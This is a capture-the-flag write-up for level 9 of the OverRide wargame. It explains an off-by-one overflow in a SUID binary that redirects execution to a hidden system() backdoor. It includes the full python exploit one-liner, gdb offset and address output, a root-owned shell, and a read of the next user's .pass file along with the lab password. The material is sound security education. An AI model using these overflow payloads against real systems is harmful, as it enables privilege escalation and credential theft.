# Level 9

## Vulnerability

Off-by-one error

## Context

We find a binary with owner ```end``` and SUID.
```
level09@OverRide:~$ ls -l
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

When run it prompts user for a username, and a message which is supposedly sent to *Unix-Dude*.
```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: Drew
>: Welcome, Drew
>: Msg @Unix-Dude
>>: Dear Unix-Dude, lots of love, Drew
>: Msg sent!
level09@OverRide:~$
```

See [disassembly notes](https://github.com/anyashuka/Override/blob/main/level09/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

## Solution

### Overview

The binary simply prompts for, then copies, username and a message.

Investigating with gdb we find a hidden function ```secret_backdoor()```, which reads to a buffer from stdin, then calls ```system()``` with the buffer. Obviously we would like to jump to ```secret_backdoor()``` somehow, and enter ```/bin/sh``` on stdin, to open a shell.

### Off-by-one error

The copy username loop has an off-by-one error, which allows the user to overwrite the ```len_message``` variable by one byte.

A larger ```len_message``` than the default 140 can cause strncpy to overflow the buffer when copying the *Msg*.

So let's fill the 40 byte username buffer then overflow by 1 byte into ```len_message```, writing the maximum 1 byte value ```0xff```.
```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude

>>: >: Msg sent!

Segmentation fault (core dumped)
```
Great, its segfaults.

### Find offset

Can we overflow and overwrite the return address of ``` ``` with the address of ```secret_backdoor()```?

Since the binary was compiled in 64-bit, RSP (not EIP) is the return address register.

[Using this buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) and the following example in gdb, we find we start to overwrite RSP after 200 bytes.
```
level09@OverRide:~$ gdb -q level09
...
(gdb) run
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah
>: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/s $rsp                                              // RSP return address
0x7fffffffe588:	 "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah"  // We find this string in the pattern string above after 200 characters
```

### Find secret_backdoor address

Finally we need to find the address of ```secret_backdoor()```.
```
(gdb) print secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

### Build exploit

So we build our exploit:
1. 40 byte username buffer, until overflow ```len``` - ```"A" * 40```
2. 1 byte, max value, overwrite ```len``` - ```\xff```
3. new line, enter unsername - ```\n```
4. 200 byte msg buffer, until overflow RSP - ```"A" * 200```
5. overwrite RSP with address of ```secret_backdoor()``` - ```\x8c\x48\x55\x55\x55\x55\x00```
6. new line, enter msg - ```\n```
7. system() open shell command - ```/bin/sh```

Let's pipe that into the binary stdin.
```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

## End

Let's log in to user ```end```.
```
level09@OverRide:~$ su end
Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
```
Good Game !
